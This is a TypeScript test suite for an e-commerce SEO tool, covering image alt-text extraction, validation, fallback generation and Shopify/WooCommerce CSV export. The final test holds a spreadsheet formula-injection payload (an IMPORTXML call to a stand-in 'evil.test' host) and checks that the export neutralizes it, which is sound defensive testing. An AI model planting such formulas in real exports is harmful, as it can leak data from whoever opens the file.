import assert from "node:assert/strict";
import test from "node:test";
import { extractImageDataFromRow, generateFallbackImageAlt, validateImageAlt } from "../lib/quality/image-alt";
import { buildOutputCSV, generateProductTemplateResult } from "../lib/generation/template-generator";

test("detects Shopify, Woo, Presta and Spanish image/alt columns", () => {
  assert.equal(extractImageDataFromRow({ "Image Src": "https://cdn.example/a.jpg", "Image Alt Text": "Zapatilla trail marca Terra" }).primaryImageUrl, "https://cdn.example/a.jpg");
  assert.deepEqual(extractImageDataFromRow({ Images: "https://cdn.example/a.jpg,https://cdn.example/b.webp" }).galleryImageUrls, ["https://cdn.example/b.webp"]);
  assert.match(extractImageDataFromRow({ "Image URLs": "https://cdn.example/a.jpg|https://cdn.example/b.jpg", "texto alternativo": "Bolso piel marrón" }).existingAltTexts[0], /Bolso/);
});

test("validates unsafe and low quality alt text", () => {
  assert.equal(validateImageAlt("Taladro percutor Bosch GSB para bricolaje y montaje").status, "good");
  assert.ok(validateImageAlt("oferta envío gratis taladro taladro taladro").warnings.includes("alt_contains_price_or_promo"));
  assert.ok(validateImageAlt("oferta envío gratis taladro taladro taladro").warnings.includes("keyword_stuffing"));
  assert.ok(validateImageAlt("image_123.jpg").warnings.includes("filename_alt"));
});

test("fallback alt is prudent and marks insufficient data", () => {
  assert.match(generateFallbackImageAlt({ productName: "Taladro percutor GSB 13 RE", brand: "Bosch", category: "Herramientas" }).alt, /Bosch/);
  assert.match(generateFallbackImageAlt({}).warning, /insuficientes/);
});

test("generation output enriches image SEO and platform exports", () => {
  const output = generateProductTemplateResult({ sku: "SKU-1", nombre_producto: "Bota seguridad S3", marca: "WorkSafe", categoria: "Calzado laboral", caracteristicas: "puntera reforzada", image_url: "https://cdn.example/bota.jpg", alt_text: "Bota de seguridad WorkSafe S3 con puntera reforzada" });
  assert.equal(output.image_alt_source, "existing");
  assert.ok((output.image_seo_score ?? 0) > 70);
  const shopify = buildOutputCSV([output], "shopify");
  assert.match(shopify, /Image Alt Text/);
  assert.match(shopify, /Bota de seguridad WorkSafe S3/);
  const woo = buildOutputCSV([output], "woocommerce");
  assert.match(woo, /Meta: _rankelia_image_alt/);
});

test("CSV export neutralizes malicious ALT formulas", () => {
  const output = generateProductTemplateResult({ sku: "SKU-2", nombre_producto: "Producto", categoria: "General", image_url: "https://cdn.example/p.jpg", alt_text: "=IMPORTXML(\"https://evil.test\",\"//x\")" });
  assert.match(buildOutputCSV([output], "rankelia"), /'=IMPORTXML/);
});
